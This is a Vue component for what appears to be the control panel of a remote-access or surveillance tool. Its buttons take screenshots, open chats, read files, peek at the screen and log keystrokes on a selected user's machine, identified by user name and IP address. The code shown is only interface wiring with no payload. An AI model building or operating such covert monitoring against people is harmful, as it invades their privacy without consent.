<template>
  <div class="tools">
    <button @click="jietu">截图</button>
    <button @click="liaotian">聊天</button>
    <button @click="fileread">文件</button>
    <button>窥屏</button>
    <button>键盘记录</button>
  </div>
</template>

<script>
import { reactive, toRefs } from "vue";
import bus from "@/utils/bus.js";
export default {
  setup() {
    const data = reactive({
      user: "",
      ip: "",
      img: "",
    });
    bus.on("seuser", (val) => {
      console.log(val);
      data.user = val.user;
      data.ip = val.ip;
    });
    const jietu = () => {
      if (!data.user && !data.ip) return alert("请选择用户");
      myApi.jietu(data.user, data.ip);
      bus.emit("sel_send_window", "jietu");
    };
    const liaotian = () => {
      if (!data.user && !data.ip) return alert("请选择用户");
      myApi.create_chat(data.user, data.ip);
      bus.emit("sel_send_window", "chat");
    };
    const fileread = () => {
      if (!data.user && !data.ip) return alert("请选择用户");
      myApi.path_read(data.user, data.ip);
      bus.emit("sel_send_window", "file");
    };
    return {
      ...toRefs(data),
      jietu,
      liaotian,
      fileread,
    };
  },
};
</script>

<style lang="less" scoped>
.tools {
  width: 100%;
  height: 10%;
  display: flex;
  button {
    width: 60px;
    height: 60px;
    margin-right: 20px;
    background: none;
    border: none;
    color: #fff;
    border: 2px #fff solid;
    border-radius: 5px;
    transition: all 0.3s;
    &:hover {
      color: skyblue;
      border: 2px skyblue solid;
    }
    &:last-child {
      margin-right: 0;
    }
  }
}
.test {
  width: 500px;
  height: 500px;
  position: fixed;
  top: 0;
  right: 0;
  z-index: 999;
}
</style>
